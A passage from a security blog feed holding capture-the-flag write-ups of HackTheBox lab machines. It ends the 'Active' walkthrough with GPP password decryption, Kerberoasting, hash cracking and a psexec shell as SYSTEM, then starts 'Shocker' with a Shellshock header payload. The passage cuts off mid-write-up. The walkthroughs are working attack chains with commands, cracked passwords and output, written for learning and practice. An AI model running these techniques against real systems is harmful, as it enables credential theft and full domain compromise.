<span class="nv">acctDisabled</span><span class="o">=</span><span class="s2">&#34;0&#34;</span> <span class="nv">userName</span><span class="o">=</span><span class="s2">&#34;active.htb\SVC_TGS&#34;</span>/&gt;&lt;/User&gt;
</span></span><span class="line"><span class="cl">&lt;/Groups&gt;
</span></span></code></pre></div><h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
<p>There is nothing much I can do in LDAP.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «active.htb» «10.10.14.83»  
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -x -h 10.10.10.100 -s base namingContexts 
</span></span><span class="line"><span class="cl">dn:
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">DC</span><span class="o">=</span>active,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">→ kali@kali «active» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -x -h 10.10.10.100 -b <span class="s2">&#34;dc=active,dc=htb&#34;</span> 
</span></span><span class="line"><span class="cl">Operations error <span class="o">(</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">Additional information: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this operation a successful <span class="nb">bind</span> must be completed on the connection., data 0, v1db1
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="access-as-svc_tgs">Access as SVC_TGS</h3>
<h4 id="group-policy-preferences-gpp---password-decrypt">Group Policy Preferences (GPP) - Password Decrypt</h4>
<p>In Windows Server 2008, Microsoft introduced a feature called <strong>Group Policy Preferences</strong>. This feature allows various Windows configurations/settings, including changing local administrator passwords, to be distributed to domain-joined computers through Group Policy.</p>
<p>When a GPP is created, it also creates an associated XML file in SYSVOL share. Some of the XML files may contains a set of credentials encrypted with AES-256. However, Microsoft <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">published the encryption key</a> and that key can be used to decrypt the password (<code>cpassword</code>) in the XML file.</p>
<p>Kali comes with a tool called <code>gpp-decrypt</code>, and this tool can be used to decrypt the <code>cpassword</code> I obtained from the <code>Groups.xml</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «active.htb» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ          
</span></span><span class="line"><span class="cl">GPPstillStandingStrong2k18
</span></span></code></pre></div><h4 id="users-share">Users Share</h4>
<p><code>CrackMapExec</code> confirms that the credentials (<code>SVC_TGS:GPPstillStandingStrong2k18</code>) are valid. I have read access now on the three other shares.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «active» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ crackmapexec smb active.htb -u <span class="s1">&#39;SVC_TGS&#39;</span> -p <span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span> --shares
</span></span><span class="line"><span class="cl">SMB         10.10.10.100    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows 6.1 Build <span class="m">7601</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span><span class="line"><span class="cl">SMB         10.10.10.100    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> active.htb<span class="se">\S</span>VC_TGS:GPPstillStandingStrong2k18 
</span></span><span class="line"><span class="cl">SMB         10.10.10.100    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> Enumerated shares
</span></span><span class="line"><span class="cl">SMB         10.10.10.100    <span class="m">445</span>    DC               Share           Permissions     Remark
</span></span><span class="line"><span class="cl">SMB         10.10.10.100    <span class="m">445</span>    DC               -----           -----------     ------
</span></span><span class="line"><span class="cl">SMB         10.10.10.100    <span class="m">445</span>    DC               ADMIN$                          Remote Admin
</span></span><span class="line"><span class="cl">SMB         10.10.10.100    <span class="m">445</span>    DC               C$                              Default share
</span></span><span class="line"><span class="cl">SMB         10.10.10.100    <span class="m">445</span>    DC               IPC$                            Remote IPC
</span></span><span class="line"><span class="cl">SMB         10.10.10.100    <span class="m">445</span>    DC               NETLOGON        READ            Logon server share 
</span></span><span class="line"><span class="cl">SMB         10.10.10.100    <span class="m">445</span>    DC               Replication     READ            
</span></span><span class="line"><span class="cl">SMB         10.10.10.100    <span class="m">445</span>    DC               SYSVOL          READ            Logon server share 
</span></span><span class="line"><span class="cl">SMB         10.10.10.100    <span class="m">445</span>    DC               Users           READ  
</span></span></code></pre></div><p>Looking into the  <code>Users</code> share, I&rsquo;m sure this share is <code>C:\Users\</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «active.htb» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ smbclient -N //10.10.10.100/Users -U <span class="s1">&#39;SVC_TGS%GPPstillStandingStrong2k18&#39;</span>
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
</span></span><span class="line"><span class="cl">  .                                  DR        <span class="m">0</span>  Sat Jul <span class="m">21</span> 10:39:20 <span class="m">2018</span>
</span></span><span class="line"><span class="cl">  ..                                 DR        <span class="m">0</span>  Sat Jul <span class="m">21</span> 10:39:20 <span class="m">2018</span>
</span></span><span class="line"><span class="cl">  Administrator                       D        <span class="m">0</span>  Mon Jul <span class="m">16</span> 06:14:21 <span class="m">2018</span>
</span></span><span class="line"><span class="cl">  All Users                       DHSrn        <span class="m">0</span>  Tue Jul <span class="m">14</span> 01:06:44 <span class="m">2009</span>
</span></span><span class="line"><span class="cl">  Default                           DHR        <span class="m">0</span>  Tue Jul <span class="m">14</span> 02:38:21 <span class="m">2009</span>
</span></span><span class="line"><span class="cl">  Default User                    DHSrn        <span class="m">0</span>  Tue Jul <span class="m">14</span> 01:06:44 <span class="m">2009</span>
</span></span><span class="line"><span class="cl">  desktop.ini                       AHS      <span class="m">174</span>  Tue Jul <span class="m">14</span> 00:57:55 <span class="m">2009</span>
</span></span><span class="line"><span class="cl">  Public                             DR        <span class="m">0</span>  Tue Jul <span class="m">14</span> 00:57:55 <span class="m">2009</span>
</span></span><span class="line"><span class="cl">  SVC_TGS                             D        <span class="m">0</span>  Sat Jul <span class="m">21</span> 11:16:32 <span class="m">2018</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="m">10459647</span> blocks of size 4096. <span class="m">5722238</span> blocks available
</span></span></code></pre></div><p>And there is a user flag in <code>SVC_TGS\Desktop</code>. I can read the flag with <code>more</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls SVC_TGS<span class="se">\D</span>esktop<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  .                                   D        <span class="m">0</span>  Sat Jul <span class="m">21</span> 11:14:42 <span class="m">2018</span>
</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Sat Jul <span class="m">21</span> 11:14:42 <span class="m">2018</span>
</span></span><span class="line"><span class="cl">  user.txt                            A       <span class="m">34</span>  Sat Jul <span class="m">21</span> 11:06:25 <span class="m">2018</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="m">10459647</span> blocks of size 4096. <span class="m">5722238</span> blocks available
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> more SVC_TGS<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
</span></span><span class="line"><span class="cl">getting file <span class="se">\S</span>VC_TGS<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt of size <span class="m">34</span> as /tmp/smbmore.uhunaP <span class="o">(</span>0.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.1 KiloBytes/sec<span class="o">)</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210711104959070.png" alt="image-20210711104959070"  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-system">Shell as SYSTEM</h3>
<h4 id="ldap---spn-enumeration">LDAP - SPN enumeration</h4>
<p>With <code>SVC_TGS</code> credentials, I&rsquo;m able to access the LDAP service. It was found that the administrator has the <code>servicePrincipalName</code> (SPN) attribute set.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «active» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -x -D <span class="s1">&#39;SVC_TGS@active.htb&#39;</span> -w <span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span> -h 10.10.10.100 -b <span class="s2">&#34;dc=active,dc=htb&#34;</span> <span class="s2">&#34;(&amp;(objectClass=user)(objectCategory=user)(servicePrincipalName=*))&#34;</span> 
</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Administrator,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">adminCount: <span class="m">1</span>
</span></span><span class="line"><span class="cl">accountExpires: <span class="m">0</span>
</span></span><span class="line"><span class="cl">logonCount: <span class="m">34</span>
</span></span><span class="line"><span class="cl">sAMAccountName: Administrator
</span></span><span class="line"><span class="cl">sAMAccountType: <span class="m">805306368</span>
</span></span><span class="line"><span class="cl">servicePrincipalName: active/CIFS:445
</span></span><span class="line"><span class="cl">objectCategory: <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h4 id="kerberoasting">Kerberoasting</h4>
<p>If a Service Principal Name is registered into a user account, the account is vulnerable to an attack called <strong>Kerberoasting</strong>. It is an attack against Kerberos to steal a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_b4041466-ae24-4fd4-83e4-5dbc4f32aaab">Service Ticket</a> (ST).</p>
<p>The attack is well explained in <a href="https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/">this blog</a> and <a href="https://hebo.gitbook.io/hackbook/active-directory/kerberoasting#0x02-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">this one</a>, but I will try to give an overview using the following image created by <a href="http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf">David Freimannis</a>. The <strong>Kerberoasting</strong> attack indicated by a red box starting from step number 3.</p>
<p><div class="img-container"><img src="imgs/image-20210715120848088.png" alt="image-20210715120848088"  title="Kerberos Mechanism"  /></div>
</p>
<center><small>Taken from “Vulnerability Assessment of Authentication Methods in a Large-Scale Computer System” by David Freimanis</small></center>
<p>Using this case, I want to access a CIFS service, so I need to ask the server (KDC) for it. The server will then search for the SPN of the CIFS service, which is <code>active/CIFS:445</code>, and that SPN is registered to the administrator account. Once the SPN is found, the server will issue a TGS (Ticket Granting Service) encrypted with NTLM hash  (derived from password)  of the administrator account and send that to the requester which is me. Now that I have TGS for the CIFS service, but instead of using (forwarding) this ticket to authenticate to the corresponding service, I keep the ticket and attempt a brute-force attack against it to recover the administrator password.</p>
<blockquote>
<p>If the SPN is registered to a computer account, it would be almost impossible to crack the TGS ticket since a computer account password is a random 128 character.</p>
</blockquote>
<p>There are several tools out there that can be used to perform a Kerberoasting attack, but I&rsquo;ll use the one from Impacket called <code>Impacket-GetUserSPNs</code>. The tool captures the ticket and automatically formats it into hashcat crackable format.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «active» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ impacket-GetUserSPNs active.htb/SVC_TGS:<span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span> -dc-ip 10.10.10.100 -request-user administrator
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
</span></span><span class="line"><span class="cl">--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
</span></span><span class="line"><span class="cl">active/CIFS:445       Administrator  <span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb  2018-07-18 15:06:40.351723  2021-07-14 12:36:18.277545             
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$23$*</span>Administrator<span class="nv">$ACTIVE</span>.HTB<span class="nv">$active</span>.htb/Administrator*<span class="nv">$92</span>c75d0a49cbaf166e656a7350827d0c<span class="nv">$a775e30</span>...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h4 id="tgs-crack">TGS Crack</h4>
<p>The password of from the obtained TGS can be recovered using hashcat.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./hashcat.exe -m <span class="m">13100</span> hashes/svc_tgs.krbhash ../../rockyou.txt -O
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$23$*</span>Administrator<span class="nv">$ACTIVE</span>.HTB<span class="nv">$active</span>.htb/Administrator*<span class="nv">$92</span>c75d0a49cbaf166e656a7350827d0c<span class="nv">$a775e30</span>...<span class="o">[</span>SNIP<span class="o">]</span>...:Ticketmaster1968
</span></span></code></pre></div><p>It is  <code>Ticketmaster1968</code>.</p>
<h4 id="impacket-psexec">Impacket-psexec</h4>
<p>Using the administrator account along with the obtained password, I&rsquo;m able to get a shell as local system using <code>impacket-psexec</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ impacket-psexec active.htb/administrator:<span class="s1">&#39;Ticketmaster1968&#39;</span>@10.10.10.100
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting shares on 10.10.10.100.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading file olAAJsqj.exe
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Opening SVCManager on 10.10.10.100.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Creating service mvjR on 10.10.10.100.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting service mvjR.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 6.1.7601<span class="o">]</span>
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2009</span> Microsoft Corporation.  All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami <span class="o">&amp;&amp;</span> ipconfig
</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Windows IP Configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Local Area Connection:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . : 
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.10.10.100
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : 10.10.10.2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Tunnel adapter isatap.<span class="o">{</span>B3FEC2C7-47CA-4014-A441-A3A5CDDC983C<span class="o">}</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Media State . . . . . . . . . . . : Media disconnected
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . : 
</span></span></code></pre></div><p>The root flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type <span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
</span></span><span class="line"><span class="cl">b5fc76...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Shocker</title>
      <link>https://fahmifj.github.io/hackthebox/shocker/</link>
      <pubDate>Tue, 13 Jul 2021 11:30:31 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/shocker/</guid>
      <description>Hands on with ShellShock vulnerability</description>
      <content:encoded><![CDATA[<p>Shocker is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on <code>perl</code> , and this can leveraged as well to gain root shell.</p>
<p>In the end of this write-up, I&rsquo;ll play a bit with Shellshock.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Exploitation of Shellshock vulnerability</li>
<li>Sudo exploitation on perl</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
<li>Gobuster</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «shocker» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ nmap -p- -sV -oA nmap/10-tcp-allport-shocker 10.10.10.56 
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-10 20:24 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.56
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.065s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed ports
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">80/tcp   open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl">2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 98.00 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>The site serves only one a text and an image.</p>
<p><div class="img-container"><img src="imgs/image-20210711072532615.png" alt="image-20210711072532615"  /></div>
</p>
<p>The server response contains uncommon Header called <code>Accept-Ranges</code>. According to <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests#requesting_a_specific_range_from_a_server">MDN</a>, this header is allows us to control the portion of the HTTP message.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «shocker» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ curl -I http://10.10.10.56
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Date: Sun, <span class="m">11</span> Jul <span class="m">2021</span> 00:49:51 GMT
</span></span><span class="line"><span class="cl">Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">Last-Modified: Fri, <span class="m">22</span> Sep <span class="m">2017</span> 20:01:19 GMT
</span></span><span class="line"><span class="cl">ETag: <span class="s2">&#34;89-559ccac257884&#34;</span>
</span></span><span class="line"><span class="cl">Accept-Ranges: bytes
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">137</span>
</span></span><span class="line"><span class="cl">Vary: Accept-Encoding
</span></span><span class="line"><span class="cl">Content-Type: text/html
</span></span></code></pre></div><p>A <a href="https://www.rapid7.com/db/modules/auxiliary/dos/http/apache_range_dos/">quick search</a> on google finds that it can be used for DDoS attack.</p>
<h4 id="gobuster">Gobuster</h4>
<p>A <code>gobuster</code> scan finds two directories:  <code>/cgi-bin/</code> and <code>/icons</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «shocker» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-S-80 -f         
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.56/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Add Slash:               <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/07/10 20:26:07 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/cgi-bin/             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 294<span class="o">]</span>
</span></span><span class="line"><span class="cl">/icons/               <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 292<span class="o">]</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>Another scan on <code>/cgi-bin/</code> discovers a file called <code>users.sh</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «shocker» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-cgi-bin -f -x cgi,sh
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.56/cgi-bin
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              cgi,sh
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Add Slash:               <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/07/10 21:43:04 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/user.sh              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 125<span class="o">]</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The <code>script.sh</code> returns the following contents.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «shocker» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ curl -s http://10.10.10.56/cgi-bin/user.sh
</span></span><span class="line"><span class="cl">Content-Type: text/plain
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Just an uptime <span class="nb">test</span> script
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> 21:46:09 up <span class="m">1</span> day, 20:28,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.00
</span></span></code></pre></div><p>According to the box name and a <code>/cgi-bin/</code> folder which contains a bash script, it&rsquo;s going to be shellshock vulnerability.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-shelly">Shell as shelly</h3>
<h4 id="shellshock-cve-2014-6271">Shellshock (CVE-2014-6271)</h4>
<p>The Shellshock vulnerability is well explained in this <a href="https://pentesterlab.com/exercises/cve-2014-6271/course">free course</a> by PentesterLab.</p>
<p>The following is the commonly used PoC for shellshock.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(){</span>:<span class="o">}</span><span class="p">;</span> echo<span class="p">;</span> &lt;bash command&gt;
</span></span></code></pre></div><p>The PoC works on <code>User-Agent</code> header.</p>
<p><div class="img-container"><img src="imgs/image-20210711090447537-1626151933213.png" alt="image-20210711090447537"  /></div>
</p>
<p>It also works on the  <code>Accept</code> header (I&rsquo;m shocked now 😄).</p>
<p><div class="img-container"><img src="imgs/image-20210711085942731.png" alt="image-20210711085942731"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>I tried to get a shell but somehow it didn&rsquo;t connect back, but then I figured out why after redirecting stderr to stderr, it wanted a full path!</p>
<p><div class="img-container"><img src="imgs/image-20210711091930431.png" alt="image-20210711091930431"  /></div>
</p>
<p>The installed <code>nc</code> doesn&rsquo;t have <code>-e</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210711092401328.png" alt="image-20210711092401328"  /></div>
</p>
